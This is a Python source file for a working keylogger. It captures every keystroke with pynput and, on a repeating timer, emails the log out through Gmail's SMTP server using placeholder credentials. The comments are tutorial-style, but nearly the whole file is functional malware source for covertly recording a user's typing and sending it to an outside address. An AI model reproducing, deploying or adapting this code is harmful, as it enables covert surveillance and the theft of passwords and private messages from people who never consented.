'''
This program tracks the keyboard input and then sends the logged input to the specified email.
'''

'''
Allows us to monitor and control mouse and keyboard.
'''
import pynput.keyboard
import threading
import smtplib

class Keylogger:


    '''
    Constructor. Executed automatically when object is created.
    '''
    def __init__(self, time_interval, email, password):
        self.log = "Keylogger started."
        self.time_interval = time_interval
        self.email = email
        self.password = password

    '''
    Append the string to the log.
    '''
    def append_to_log(self, string):
        self.log += string

    '''
    A callback function. A callback function is a function passed to a method so that the method
    can call the function when the method has completed its work.
    '''
    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:  #If the key is not a character then an exception is thrown.fde df
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "

        self.append_to_log(current_key)

    '''
    Function to send an email about the user key strokes. Runs on a separate thread. 
    A function that calls itself is a recursive function.
    '''
    def report(self):
        print(self.log)
        self.sendMail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.time_interval, self.report)    #After 5 seconds call the function report, runs on a separate thread.
        timer.start()

    '''
    Sends the log to email.
    '''
    def sendMail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    '''
    Starts listening for keyboard input and then sends the results to an email.
    '''
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)    #Everytime a key is pressed print it.
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''
PROGRAM STARTS HERE
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''

my_keylogger = Keylogger(20, "email@example.com", "passw0rd")   #Add the time interval and email and password.
my_keylogger.start()




